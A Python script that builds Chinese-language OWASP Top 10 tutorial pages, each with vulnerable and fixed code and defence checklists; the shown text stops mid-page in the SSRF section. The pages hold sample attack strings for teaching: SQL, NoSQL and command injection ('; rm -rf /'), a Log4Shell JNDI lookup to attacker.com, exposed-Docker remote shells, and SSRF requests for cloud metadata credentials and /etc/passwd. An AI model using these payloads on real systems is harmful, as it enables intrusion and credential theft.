"""Generate security stub pages via CONTENT dictionary.

Reuses the pattern from scripts/gen-obs-stubs.py and scripts/gen-pg-stubs.py:
- Each entry is a multiline string with Frontmatter + 5-7 H2 sections + code blocks + 实战案例 + 关联章节 + 一句话总结
- After write, run find -size -3000c to find any remaining stubs
"""
import os

DOCS_ROOT = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "..", "security-html", "docs",
)

CONTENT = {

# ============ 01-web-top10 (9 stubs) ============
"01-web-top10/a01-broken-access.md": """---
title: A01 访问控制失效
---

# A01 · Broken Access Control（访问控制失效）

## 一句话总结

> **访问控制失效 = 越权访问**。**典型：水平越权（看别人的订单）/ 垂直越权（普通用户拿管理员权限）**。**防御：服务端校验 + 最小权限 + 资源所有权检查**。

---

## 什么是访问控制失效

访问控制是 Web 应用最基础的安全机制——**谁被允许做什么**。失效意味着：
- 用户 A 能访问用户 B 的资源（**水平越权 / IDOR**）
- 普通用户能调管理员 API（**垂直越权 / Privilege Escalation**）
- 没登录用户能访问登录后页面（**认证缺失**）

OWASP 2021 起，**A01 连续 4 年位居 Top 10 第一**。

## 典型攻击场景

### 1. 水平越权（IDOR）

```http
GET /api/v1/orders/12345
```

```http
GET /api/v1/orders/12346    ← 改个 ID，看别人的订单
GET /api/v1/users/789       ← 改个 ID，看别人的资料
```

```python
# ❌ 错误代码：直接信任 URL 里的 ID
@app.get("/api/v1/orders/{order_id}")
def get_order(order_id: int, current_user: User = Depends(get_current_user)):
    return db.get(Order, order_id)

# ✅ 正确：校验资源所有权
@app.get("/api/v1/orders/{order_id}")
def get_order(order_id: int, current_user: User = Depends(get_current_user)):
    order = db.get(Order, order_id)
    if order.user_id != current_user.id:
        raise HTTPException(403, "Forbidden")
    return order
```

### 2. 垂直越权

```http
# 普通用户尝试访问管理员路由
POST /api/v1/admin/users
Body: {"role": "admin"}
```

```python
# 防御：基于角色的访问控制（RBAC）
def require_admin(current_user: User = Depends(get_current_user)):
    if "admin" not in current_user.roles:
        raise HTTPException(403, "Admin only")
    return current_user

@app.delete("/api/v1/users/{user_id}", dependencies=[Depends(require_admin)])
def delete_user(user_id: int):
    db.delete(User, user_id)
```

## 实战案例：GitHub 私有仓库泄漏

某 API 端点没校验仓库归属，攻击者用 GitHub ID 遍历拿到私有仓库元数据。修复：服务端强制校验 `current_user` 对资源的所有权。

## 防御清单

| 措施 | 落地 |
|------|------|
| 默认拒绝 | `AuthorizationPolicy` 默认 deny |
| 所有权校验 | Service 层强制校验 `resource.owner_id == user.id` |
| 最小权限 | RBAC / OAuth 2.0 Scope |
| 失效访问 token | JWT blacklisting / 短 TTL |
| 审计日志 | 关键操作全留痕 |

## 关联章节

- **01-web-top10/a07-auth-failure**：A07 认证失效（前置）
- **02-auth/jwt**：JWT 无状态 vs 状态化撤销
- **06-zero-trust**：零信任 = 默认 deny + 持续验证

## 一句话总结

> **A01 访问控制失效 = 越权访问**。**防护核心：每个 API 都校验「当前用户对资源的权限」**。**永远不要相信客户端传来的 ID**。
""",

"01-web-top10/a02-crypto-failure.md": """---
title: A02 加密机制失效
---

# A02 · Cryptographic Failures（加密机制失效）

## 一句话总结

> **加密失效 = 数据裸奔**。**典型：明文存密码 / 用 MD5 / HTTP 传输敏感数据 / 弱 TLS 算法**。**防御：TLS 1.3 + bcrypt + 静态加密 + 密钥管理**。

---

## 什么是加密机制失效

A02 涵盖**所有与加密相关的失误**——不是"没用加密"，而是"用错了"或"用得太弱"：

| 场景 | 错误 | 风险 |
|------|------|------|
| 密码存储 | 明文存数据库 | 数据库泄漏 = 全员密码 |
| 密码哈希 | MD5 / SHA-1 | 彩虹表秒破 |
| 传输 | HTTP 传输密码 | 中间人窃取 |
| 静态加密 | 自制 XOR 算法 | 几乎不加密 |
| 密钥管理 | 硬编码在源码 | Git 泄漏 = 全公司失守 |

## 错误 vs 正确做法

### 密码哈希

```python
# ❌ MD5 / SHA-1（彩虹表秒破）
import hashlib
password = hashlib.md5(user_input.encode()).hexdigest()

# ❌ SHA-256（GPU 每秒 10 亿次，太快）
password = hashlib.sha256(user_input.encode()).hexdigest()

# ✅ Argon2id（OWASP 推荐）
from argon2 import PasswordHasher
ph = PasswordHasher()
password_hash = ph.hash(user_input)

# ✅ bcrypt（成熟、广泛支持）
import bcrypt
password_hash = bcrypt.hashpw(user_input.encode(), bcrypt.gensalt(rounds=12))
```

### TLS 配置

```nginx
# ❌ 启用 TLS 1.0 / 1.1（POODLE / BEAST 漏洞）
ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;

# ✅ 仅 TLS 1.2 / 1.3
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;

# ✅ 强制 HTTPS
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

## 实战：Equifax 1.45 亿用户泄漏（2017）

Equifax 因 **Apache Struts 已知 CVE** + **TLS 证书管理混乱** + **加密策略错误**，导致 1.45 亿用户数据泄漏。**教训**：加密不是单一环节，是体系。

## 防御清单

| 措施 | 落地 |
|------|------|
| 强密码哈希 | Argon2id / bcrypt（cost ≥ 12）|
| 敏感字段加密 | 用户手机号 / 身份证（AES-256-GCM）|
| 密钥管理 | HashiCorp Vault / AWS KMS / Azure Key Vault |
| TLS 1.3 强制 | nginx / Spring Boot 全栈 |
| 不存敏感数据 | 信用卡只存 token（PCI-DSS 要求） |
| 强制 HTTPS | HSTS preload |

## 关联章节

- **03-crypto**：密码学算法选型
- **03-crypto/hash**：bcrypt / Argon2
- **04-network/tls-pki**：TLS PKI 体系
- **04-network/hsts-csp**：HSTS 强制 HTTPS

## 一句话总结

> **A02 加密机制失效 = 用错加密**。**核心：密码用 bcrypt/Argon2，传输用 TLS 1.3，密钥用 Vault/GMS**。**永远不要自己发明加密算法**。
""",

"01-web-top10/a03-injection.md": """---
title: A03 注入攻击
---

# A03 · Injection（注入攻击）

## 一句话总结

> **注入 = 把代码当数据执行**。**SQL 注入 / NoSQL 注入 / 命令注入 / LDAP 注入 / XSS（HTML 注入）**。**核心防御：参数化查询 / ORMs / 输入校验 + 输出转义**。

---

## SQL 注入经典案例

```http
POST /api/v1/login
{
    "username": "admin' OR '1'='1",
    "password": "anything"
}
```

```sql
-- 查询被拼接 → 恒真
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

```python
# ❌ 字符串拼接
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")

# ✅ 参数化查询（Prepared Statement）
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

## 各类注入一览

| 类型 | 攻击向量 | 防御 |
|------|---------|------|
| **SQL 注入** | `' OR 1=1 --` | 参数化查询 |
| **NoSQL 注入** | `{"$gt": ""}` | MongoDB 类型校验 |
| **OS 命令注入** | `; rm -rf /` | 白名单命令 + 沙箱 |
| **LDAP 注入** | `*)(&` | 框架转义 |
| **XSS（HTML 注入）** | `<script>alert(1)</script>` | 输出转义 |
| **XPATH 注入** | `' or '1'='1` | XQuery 参数化 |
| **模板注入（SSTI）** | `{{7*7}}` | 不用字符串拼接 |

## 实战：SQL 注入读取整张表

```sql
-- 攻击 payload
' UNION SELECT username, password FROM users --
```

```sql
-- 防御 1：参数化
SELECT * FROM products WHERE id = ?

-- 防御 2：ORM（Hibernate / SQLAlchemy / MyBatis #{}）
Product.find_by(id=123)

-- 防御 3：最小权限（应用账号只读 + 限定表）
GRANT SELECT ON shop.products TO 'app'@'%';
```

## 实战：Command Injection（Python）

```python
import subprocess

# ❌ 字符串拼接（危险）
user_input = input("Domain: ")
result = subprocess.run(f"nslookup {user_input}", shell=True)

# 用户输入："; rm -rf /; echo " → 直接删库

# ✅ 用列表 + shell=False
result = subprocess.run(["nslookup", user_input], shell=False, capture_output=True)
```

## 实战：MongoDB NoSQL 注入

```python
# ❌ 接受 JSON 直接传 MongoDB
db.users.find({
    "username": request.json["username"],
    "password": request.json["password"]
})

# 攻击者 POST：
# {"username": "admin", "password": {"$gt": ""}}
# → password 永远为真

# ✅ 类型校验
from pydantic import BaseModel, constr
class LoginReq(BaseModel):
    username: constr(min_length=1, max_length=64)
    password: constr(min_length=1, max_length=128)
```

## 防御清单

| 措施 | 落地 |
|------|------|
| **参数化查询** | SQLAlchemy / MyBatis #{} / Hibernate |
| **ORM** | 95% 场景 ORM 够用 |
| **输入校验** | 白名单 + 长度限制 |
| **输出转义** | Thymeleaf / React 自动转义 |
| **最小权限** | DB 账号降权 |
| **WAF** | ModSecurity / Cloudflare |

## 关联章节

- **mysql** / **postgresql** → SQL 注入原理与防御
- **cloud-native** → 容器逃逸（含命令执行）
- **01-web-top10/a05-misconfig**：A05 配置错误含 SQL 调试模式

## 一句话总结

> **A03 注入 = 把代码当数据**。**核心防御：参数化查询 + ORM + 输入校验 + 输出转义**。**拼接字符串 = 危险**。
""",

"01-web-top10/a04-insecure-design.md": """---
title: A04 不安全设计
---

# A04 · Insecure Design（不安全设计）

## 一句话总结

> **A04 = 设计阶段的安全缺失**。**不是 bug，是 architecturally flawed**。**核心：威胁建模（STRIDE / PASTA） + 安全设计模式 + 限流 / 幂等 / 状态机**。

---

## 什么是"不安全设计"

A04 是 2025 新独立的类别——**有些问题无法通过代码修复，只能重设计**：

| 错误的设计 | 危害 |
|----------|------|
| 密码重置无状态机（任何人都能无限次重试） | 邮箱轰炸 / 暴力破解 |
| 找回密码返回原密码 | 数据库泄漏 = 密码全裸 |
| 业务流程允许跳过验证步骤 | 跳过 KYC / 风控 |
| 无速率限制 | 暴力破解 / 资源耗尽 |
| 关键操作无二次验证 | 单一密码泄漏 = 全面失守 |
| 单一密码当唯一 MFA | 钓鱼失败 |

## 案例：密码找回流程设计

```python
# ❌ 不安全设计：返回数据库里明文密码
@app.post("/forgot-password")
def forgot(email: str):
    user = db.users.find_one(email=email)
    return {"password": user.password}  # 灾难！

# ✅ 安全设计：发邮件 + 一次性 token + 强制改密码
@app.post("/forgot-password")
def forgot(email: str):
    user = db.users.find_one(email=email)
    token = secrets.token_urlsafe(32)
    db.reset_tokens.insert({"user_id": user.id, "token": token, "expires_at": now + 15min})
    send_email(email, f"https://example.com/reset?token={token}")
    return {"message": "Check your email"}
```

## 威胁建模（STRIDE）

| 维度 | 威胁 | 缓解 |
|------|------|------|
| **S**poofing 欺骗 | 伪造身份 | MFA / 数字证书 |
| **T**ampering 篡改 | 改数据 | 签名 / 哈希 |
| **R**epudiation 抵赖 | 否认操作 | 审计日志 |
| **I**nformation Disclosure | 数据泄漏 | 加密 / 最小权限 |
| **D**enial of Service | 拒绝服务 | 限流 / 熔断 |
| **E**levation of Privilege | 提权 | RBAC / 最小权限 |

### 实战：电商下单流程 STRIDE

```
┌────────────────────────────────────────┐
│  流程：浏览 → 加购 → 支付 → 完成        │
├────────────────────────────────────────┤
│  S 欺骗：登录态伪造 → MFA 强制          │
│  T 篡改：订单金额改 → 服务端校验        │
│  R 抵赖：支付失败纠纷 → 完整操作日志    │
│  I 泄漏：消费数据 → 静态加密            │
│  D 拒绝：黄牛抢 → 限流 + 验证码         │
│  E 提权：普通用户改价格 → RBAC 校验     │
└────────────────────────────────────────┘
```

## 实战：限流（Rate Limiting）

```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@app.post("/api/v1/login")
@limiter.limit("5/minute")  # 每分钟最多 5 次
def login(req: LoginRequest):
    ...
```

## 实战：幂等设计

```python
# 关键操作幂等（防止重复扣款）
@app.post("/api/v1/payment")
def pay(req: PaymentReq, idempotency_key: str = Header(...)):
    # 用 idempotency_key 防止重复
    if redis.exists(f"payment:{idempotency_key}"):
        return redis.get(f"payment:{idempotency_key}")
    result = do_payment(req)
    redis.setex(f"payment:{idempotency_key}", 3600, result)
    return result
```

## 关联章节

- **01-web-top10/a07-auth-failure**：A07 认证失效
- **02-auth/mfa**：MFA 强制补齐"Crucial operation"
- **06-zero-trust/overview**：零信任 = 持续验证

## 一句话总结

> **A04 不安全设计 = 架构层缺陷**。**修复需要：威胁建模 + 安全设计模式 + 限流 + 幂等 + 状态机**。**代码层补不回来的要回到设计**。
""",

"01-web-top10/a05-misconfig.md": """---
title: A05 安全配置错误
---

# A05 · Security Misconfiguration（安全配置错误）

## 一句话总结

> **A05 = 默认 / 调试 / 错误配置**。**典型：默认密码 admin/admin / .git 暴露 / 堆栈信息泄漏 / debug 模式 / 卸载的组件残留**。**防御：硬化清单 + 持续审计 + IaC**。

---

## 常见配置错误

| 错误 | 危害 |
|------|------|
| 默认密码 admin/admin | 攻击者常用字典直接打 |
| 暴露 `.git` / `.env` | 源码 + 密钥泄漏 |
| Spring Boot Actuator 全开 | /env /heapdump 拉密钥 |
| PHP `display_errors=on` | 堆栈信息暴露文件路径 |
| Docker 监听 0.0.0.0:2375 | 远程 Docker 完全控制 |
| K8s Dashboard 公网 | 集群一键接管 |
| 卸载残留的 demo / test 路由 | 攻击者未授权访问 |
| CORS `*` + 凭证 | 跨域带 cookie |
| 目录列举 | 文件结构暴露 |

## 实战：Spring Boot Actuator 暴露

```yaml
# ❌ 不安全：暴露所有 endpoint
management:
  endpoints:
    web:
      exposure:
        include: "*"

# ✅ 安全：只暴露 health + prometheus
management:
  endpoints:
    web:
      exposure:
        include: "health,prometheus"
  endpoint:
    health:
      show-details: when-authorized
```

```bash
# 攻击路径
$ curl https://target.com/actuator/env
# 拿到所有环境变量，包括 AWS_ACCESS_KEY / 数据库密码
```

## 实战：Nginx 配置错误

```nginx
# ❌ 错误：目录列举
server {
    location / {
        root /var/www/app;
        autoindex on;  # 危险！
    }
}

# ✅ 正确：禁止
server {
    location / {
        root /var/www/app;
        autoindex off;
    }
}
```

## 实战：Kubernetes Dashboard

```yaml
# ❌ 默认配置（公开暴露）
apiVersion: v1
kind: Service
metadata:
  name: kubernetes-dashboard
spec:
  type: LoadBalancer  # 公网可访问！
  ports:
    - port: 443
      targetPort: 8443
```

## 实战：Docker 远程 API

```bash
# 默认 /etc/docker/daemon.json
{
  "hosts": ["tcp://0.0.0.0:2375", "unix:///var/run/docker.sock"]
}
# 攻击者直接 docker -H tcp://target:2375 run -it alpine sh
```

## 防御清单

| 措施 | 落地 |
|------|------|
| **硬化基线** | CIS Benchmark（OS / K8s / DB） |
| **IaC 扫描** | tfsec / checkov / Snyk IaC |
| **持续审计** | Trivy / ScoutSuite / Prowler |
| **环境隔离** | dev/staging/prod 严格隔 |
| **默认 deny** | 防火墙 + NetworkPolicy |
| **环境变量管理** | Vault / Sealed Secrets |
| **错误处理** | 生产关闭 debug 模式 |

## 自动化扫描

```bash
# CIS benchmark
docker run --net host --pid host --userns host --cap-add audit_control \
    -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
    --label docker_bench_security \
    docker/docker-bench-security

# 配置扫描
prowler aws --severity critical
```

## 关联章节

- **01-web-top10/a01-broken-access**：A01 默认允许
- **04-network/hsts-csp**：HTTP 安全头
- **05-container/overview**：容器配置安全

## 一句话总结

> **A05 配置错误 = 默认不安全**。**核心：硬化基线 + 自动审计 + 生产最小开放**。**Debug / 默认密码 / 暴露接口 = 前 3 大常见**。
""",

"01-web-top10/a06-vulnerable-component.md": """---
title: A06 易受攻击组件
---

# A06 · Vulnerable & Outdated Components（易受攻击组件）

## 一句话总结

> **A06 = 用了有漏洞的依赖 / 框架 / OS**。**经典：Log4Shell / Spring4Shell / Struts 漏洞**。**防御：SBOM + 依赖扫描 + 及时升级 + 虚拟补丁**。

---

## 经典案例

| 漏洞 | 年份 | 影响 |
|------|------|------|
| **Log4Shell** (CVE-2021-44228) | 2021 | Log4j 远程代码执行（RCE） |
| **Spring4Shell** (CVE-2022-22965) | 2022 | Spring Core RCE |
| **Struts 2** (S2-045 等) | 2017 | Equifax 1.45 亿泄漏 |
| **Heartbleed** (CVE-2014-0160) | 2014 | OpenSSL 内存泄漏 |
| **Shellshock** (CVE-2014-6271) | 2014 | Bash 远程命令执行 |
| **Polkit** (CVE-2021-4034) | 2022 | Linux 通用提权 |

## 实战：Log4Shell 复现

```java
// 攻击 payload
String userAgent = "${jndi:ldap://attacker.com/Exploit}";
// Log4j 2.0 ≤ 2.14.1 解析 → 连接 LDAP → 下载恶意类 → RCE
```

## 实战：扫描项目依赖

```bash
# npm
npm audit
npm audit fix

# Python
pip install pip-audit
pip-audit

# Java
mvn org.owasp:dependency-check-maven:check
# 或 trivy fs .
```

## 实战：自动化升级

```yaml
# GitHub Dependabot
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
```

```yaml
# GitLab Renovate
# renovate.json
{
  "extends": ["config:base"],
  "automerge": true,
  "packageRules": [
    { "matchUpdateTypes": ["patch"], "automerge": true }
  ]
}
```

## 实战：SBOM（软件物料清单）

```bash
# 生成 SBOM
trivy fs --format cyclonedx --output sbom.json .
# 或
syft . -o cyclonedx-json > sbom.json
```

```yaml
# SPDX 格式（人类可读）
SPDXVersion: SPDX-2.3
DataLicense: CC0-1.0
SPDXID: SPDXRef-DOCUMENT
DocumentName: sbom
Creator: Tool: trivy-0.45.0
Package: log4j-core
  Version: 2.17.0
  Supplier: Organization: Apache
  PackageVerificationCode: abc123
```

## 防御清单

| 措施 | 落地 |
|------|------|
| **依赖扫描** | Snyk / Dependabot / Renovate |
| **SBOM 生成** | Syft / Trivy / Tern |
| **及时升级** | 关键 CVE 24h 内修复 |
| **虚拟补丁** | WAF / ModSecurity 临时缓解 |
| **运行时 RASP** | Contrast / OpenRASP |
| **镜像扫描** | Trivy / Grype（详见 05-container）|

## 关联章节

- **05-container/overview**：镜像扫描
- **05-container/supply-chain**：SBOM 供应链
- **release/adr/004-security**：A06 与供应链安全同源

## 一句话总结

> **A06 = 用了有洞的依赖**。**核心：SBOM + 自动扫描 + 及时升级 + 虚拟补丁**。**Log4Shell 级别 CVE 24h 内必须修复**。
""",

"01-web-top10/a07-auth-failure.md": """---
title: A07 认证失效
---

# A07 · Identification & Authentication Failures（认证失效）

## 一句话总结

> **A07 = 身份认证机制被突破**。**典型：弱密码 / 明文凭证 / Session ID 暴露 / 登录端点 brute force**。**防御：强密码策略 + MFA + 限流 + 安全的 Session 管理**。

---

## 常见认证失效

| 失效点 | 危害 |
|--------|------|
| 允许弱密码（如 `123456`） | 字典攻击秒破 |
| 密码明文传输 | 中间人窃取 |
| Session ID 在 URL | referer 泄漏 |
| Session 永不过期 | 一次性登录终身有效 |
| 登录端点无限次试 | 暴力破解 |
| 密码找回流程缺陷 | 接管任意账号 |
| 凭证填充（Credential Stuffing） | 撞库 |
| 暴露测试账号 | demo:guest/123 |

## 实战：密码策略

```python
# ❌ 弱密码
def validate_password(pwd):
    return len(pwd) >= 6

# ✅ NIST SP 800-63B 标准
def validate_password(pwd: str) -> bool:
    if len(pwd) < 12:
        return False
    # 检查 HIBP 泄漏库（k-anonymity API）
    import hashlib
    sha = hashlib.sha1(pwd.encode()).hexdigest().upper()
    prefix, suffix = sha[:5], sha[5:]
    r = httpx.get(f"https://api.pwnedpasswords.com/range/{prefix}")
    return suffix not in r.text
```

## 实战：登录限流

```python
# Redis 滑动窗口
def is_rate_limited(ip: str, attempts: int = 5) -> bool:
    key = f"login:fail:{ip}"
    count = redis.incr(key)
    redis.expire(key, 900)  # 15 分钟
    if count > attempts:
        return True
    return False

# 锁定 15 分钟
def lock_account(user_id: int):
    redis.setex(f"account:locked:{user_id}", 900, "1")
```

## 实战：Session 管理

```python
# ❌ Session ID in URL（referer 泄漏）
@app.get("/dashboard")
def dashboard(session_id: str):  # 危险！
    return check_session(session_id)

# ✅ Cookie + HttpOnly + Secure + SameSite
response.set_cookie(
    "session_id",
    value=secrets.token_urlsafe(32),
    httponly=True,
    secure=True,
    samesite="strict",
    max_age=3600,  # 1 小时过期
)
```

nginx 安全头：

```nginx
add_header Set-Cookie "session_id=xxx; HttpOnly; Secure; SameSite=Strict";
add_header X-Frame-Options "DENY";
add_header X-Content-Type-Options "nosniff";
```

## 实战：MFA 实现

```python
# TOTP (Time-based One-Time Password)
import pyotp

# 用户注册时生成 secret
secret = pyotp.random_base32()
db.user.update(mfa_secret=secret)

# 登录时
totp = pyotp.TOTP(secret)
user_token = input("Enter MFA code: ")
if totp.verify(user_token, valid_window=1):
    return "Login success"
```

## 实战：密码找回安全

```python
# ❌ 缺陷：返回当前密码
@app.post("/forgot-password")
def forgot(email: str):
    user = db.users.find_by(email=email)
    return {"current_password": user.password}

# ✅ 安全：发邮件 + 一次性 token
@app.post("/forgot-password")
def forgot(email: str):
    user = db.users.find_by(email=email)
    token = secrets.token_urlsafe(32)
    db.reset_tokens.insert({
        "user_id": user.id,
        "token": hashlib.sha256(token.encode()).hexdigest(),
        "expires_at": datetime.now() + timedelta(minutes=15),
    })
    send_email(email, f"https://example.com/reset?token={token}")
```

## 防御清单

| 措施 | 落地 |
|------|------|
| 强密码 | NIST 800-63B / HIBP 检查 |
| 密码哈希 | Argon2 / bcrypt |
| MFA | TOTP / WebAuthn / FIDO2 |
| 限流 | 登录 5 次/15min 锁 |
| 安全的 Session | HttpOnly + Secure + SameSite + 短 TTL |
| 找回流程 | 一次性 token + 15 分钟过期 |
| 业务防御 | 异常登录告警 / 异地提醒 |

## 关联章节

- **02-auth/overview**：认证协议地图
- **02-auth/jwt**：JWT Session 化
- **02-auth/mfa**：MFA 进阶
- **02-auth/session-attack**：Session 攻击矩阵

## 一句话总结

> **A07 认证失效 = 弱认证或认证失效**。**核心：强密码 + MFA + 安全 Session + 限流 + 找回流程设计**。**永远不要相信前端校验**。
""",

"01-web-top10/a08-software-data-integrity.md": """---
title: A08 软件数据完整性
---

# A08 · Software & Data Integrity Failures（软件数据完整性失效）

## 一句话总结

> **A08 = 软件更新 / 数据不可信**。**典型：自动更新无签名 / CI/CD 凭证泄漏 / 不安全反序列化**。**防御：签名验证 + SLSA 框架 + 不可变基础设施 + CSP 严格模式**。

---

## 常见失效场景

| 失效 | 危害 |
|------|------|
| 自动更新无签名 | 攻击者替换升级包 |
| CI/CD 凭证泄漏 | 供应链投毒 |
| npm install 任意包 | typosquatting / 恶意包 |
| 不安全反序列化 | Java ObjectInputStream RCE |
| 客户端 JS 未做 SRI | CDN 投毒 |
| WebHook 无校验 | 伪造第三方事件 |

## 实战：CI/CD 凭证泄漏

```bash
# 2021 年 Codecov 事件：攻击者通过修改 bash uploader 注入
# bash <(curl -u $CODECOV_TOKEN https://codecov.io/bash)
# 拿到所有客户的 CI 环境变量（含 AWS / GitHub 凭证）
```

## 实战：npm 恶意包

```bash
# typosquatting：跨相似包名
# 真实事件：event-stream 被注入 bitpay/crypto-stealer
```

## 防御框架：SLSA

```
┌────────────────────────────────────────┐
│  SLSA Levels（Supply-chain Levels for    │
│  Software Artifacts）                   │
├────────────────────────────────────────┤
│  L0：无 SLSA                            │
│  L1：构建过程文档化 + 签名              │
│  L2：构建服务签名 + 完整来源追溯        │
│  L3：来源防篡改 + 防泄露 + 双签        │
└────────────────────────────────────────┘
```

## 实战：Cosign 签名镜像

```bash
# 签名镜像
cosign sign --key cosign.key myregistry.io/myapp:1.0.0

# 验证签名
cosign verify --key cosign.pub myregistry.io/myapp:1.0.0

# K8s 准入控制（拒绝未签名镜像）
# Kyverno / Connaisseur / sigstore-policy-controller
```

## 实战：Java 反序列化攻击

```java
// ❌ 危险：ObjectInputStream
ObjectInputStream ois = new ObjectInputStream(input);
Object obj = ois.readObject();  // RCE 风险
// 攻击者构造 gadget chain → 远程代码执行

// ✅ 安全：JSON / Protobuf / 自定义协议
MyClass obj = objectMapper.readValue(input, MyClass.class);
```

## 实战：浏览器 SRI（Subresource Integrity）

```html
<!-- CDN 加载 JS 时校验哈希 -->
<script
  src="https://cdn.jsdelivr.net/npm/vue@3.4.0/dist/vue.global.js"
  integrity="sha384-7S2R0gTqWfEE3eCfVf3K6QjM7z5x7f5j7s5x7f5j7s5x7f5j7s5x7f5j7s5x7"
  crossorigin="anonymous">
</script>
```

## 实战：WebHook 签名

```python
import hmac
import hashlib

# GitHub Webhook 签名校验
def verify_webhook(payload: bytes, signature: str, secret: str) -> bool:
    expected = "sha256=" + hmac.new(
        secret.encode(), payload, hashlib.sha256
    ).hexdigest()
    return hmac.compare_digest(expected, signature)

# Stripe 也用相同模式
```

## 防御清单

| 措施 | 落地 |
|------|------|
| 签名 | Cosign / Sigstore / The Update Framework |
| SLSA L3 | Google SLSA 框架 |
| 镜像准入 | Kyverno / Connaisseur |
| SRI | 浏览器加载校验 |
| 反序列化 | JSON / Protobuf 替代 |
| WebHook 签名 | HMAC-SHA256 |
| 不可变基础设施 | 容器镜像 + 重建 vs 修补 |

## 关联章节

- **05-container/supply-chain**：完整供应链
- **05-container/runtime-security**：运行时镜像验证
- **06-zero-trust/spiffe**：工作负载身份

## 一句话总结

> **A08 软件数据完整性 = 供应链不可信**。**核心：签名 + SLSA + 准入控制 + 不可变基础设施**。**CI/CD 凭证泄漏 = 全公司失守**。
""",

"01-web-top10/a09-logging-failure.md": """---
title: A09 日志与监控失效
---

# A09 · Security Logging & Monitoring Failures（日志与监控失效）

## 一句话总结

> **A09 = 攻击者来了你不知道**。**典型：登录失败不记录 / 告警缺位 / 日志被攻击者清除 / 审计日志不可追溯**。**防御：完整审计日志 + 实时告警 + 不可篡改的日志存储**。

---

## 常见失效

| 失效 | 后果 |
|------|------|
| 登录失败不记录 | 暴力破解无人知 |
| 关键操作不审计 | 数据泄漏无法追溯 |
| 日志只存本地 | 攻击者 rm -rf |
| 没有告警 | 攻击 30 天才发现 |
| 缺乏演练 | 真实事件慌乱 |
| 缺乏关联 | 单点异常无法识别攻击链 |

## 实战：缺失日志 = 攻击者 200 天未被发现

```bash
# 真实案例：某公司 200 天才发现数据泄漏
# 攻击者每天导出 10 GB
# 没有"外发流量异常"告警
```

## 实战：JWT 异常监控

```python
import logging

# 登录失败
def on_login_failed(username, ip):
    logging.warning(f"LOGIN_FAILED user={username} ip={ip}")

# JWT 异常
def on_jwt_invalid(jwt_token, reason):
    logging.error(f"JWT_INVALID reason={reason} token_prefix={jwt_token[:20]}")

# 限流触发
def on_rate_limit_exceeded(ip, endpoint):
    logging.warning(f"RATE_LIMIT_EXCEEDED ip={ip} endpoint={endpoint}")
```

## 实战：审计日志结构

```json
{
  "timestamp": "2026-08-10T10:30:00.123Z",
  "event_type": "user.login",
  "result": "success",
  "user_id": 12345,
  "username": "alice@example.com",
  "ip": "192.168.1.100",
  "user_agent": "Mozilla/5.0...",
  "mfa": "totp",
  "session_id": "sess_abc123",
  "request_id": "req_xyz789",
  "geo": {"country": "CN", "city": "Beijing"}
}
```

## 实战：实时告警（SIEM）

```yaml
# Splunk / ELK / Datadog SIEM 规则
- name: "Suspicious login from new country"
  query: |
    event_type=user.login AND result=success
    | lookup geoip ip
    | stats count by user_id, country
    | where count > 1 and country != "CN"
  alert: "Possible account takeover"
  severity: high

- name: "Privilege escalation"
  query: |
    event_type=user.role_changed AND new_role="admin"
  alert: "New admin created"
  severity: critical
```

## 实战：日志不可篡改

```bash
# 集中日志存储 + WORM (Write Once Read Many)
# AWS S3 Object Lock
aws s3api put-object-lock-configuration \
    --bucket audit-logs \
    --object-lock-configuration '{
        "ObjectLockEnabled": "Enabled",
        "Rule": {
            "DefaultRetention": {
                "Mode": "GOVERNANCE",
                "Years": 7
            }
        }
    }'

# 或用 syslog-ng 远程 + 签名
```

## 防御清单

| 措施 | 落地 |
|------|------|
| 登录审计 | 成功 / 失败 / 异常全部记录 |
| 关键操作 | 权限变更 / 数据导出 / 资金操作 |
| 集中日志 | ELK / Loki / Splunk / Datadog |
| 长期保留 | 7 年（合规）/ 1 年（普通）|
| 实时告警 | SIEM / 异常检测 |
| 不可篡改 | S3 Object Lock / WORM |
| 演练 | 季度红蓝对抗 |

## 关联章节

- **observability/08-alerting**：告警与值班
- **observability/09-app-instrumentation**：日志埋点
- **01-web-top10/a04-insecure-design**：A04 不安全设计 = 监控缺失设计

## 一句话总结

> **A09 日志缺失 = 攻击者隐身**。**核心：完整审计 + 实时告警 + 不可篡改 + 持续演练**。**没有预警 = 200 天才发现**。
""",

"01-web-top10/a10-ssrf.md": """---
title: A10 SSRF 服务端请求伪造
---

# A10 · Server-Side Request Forgery（服务端请求伪造）

## 一句话总结

> **SSRF = 让服务器替你请求**。**典型：图片代理 fetches 任意 URL / Webhook 验证可控 / 云元数据 169.254.169.254**。**防御：URL 白名单 + DNS 解析校验 + 禁用内网 IP + 隔离网络**。

---

## 什么是 SSRF

服务端接受用户输入的 URL，然后**服务端**去请求这个 URL。攻击者利用它：
- 访问内网（数据库 / Redis / Admin Panel）
- 读取云元数据（AWS IAM 凭证）
- 端口扫描内网
- 绕过外网访问控制

## 经典攻击：AWS 元数据窃取

```python
# ❌ 漏洞代码：接受 URL 拉图片
@app.get("/fetch-image")
def fetch_image(url: str):
    return requests.get(url).content

# 攻击者请求
GET /fetch-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
# → 拿到 AWS IAM 临时凭证
```

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-08-10T16:30:00Z"
}
# 攻击者用这个 token 访问 S3 / EC2 / RDS
```

## 实战：内网探测

```bash
# 端口扫描
GET /fetch-image?url=http://internal-db:5432/
GET /fetch-image?url=http://192.168.1.1/admin

# 读取本地文件
GET /fetch-image?url=file:///etc/passwd

# 协议利用
GET /fetch-image?url=gopher://internal-redis:6379/_FLUSHALL
```

## 防御清单

### 1. URL 白名单

```python
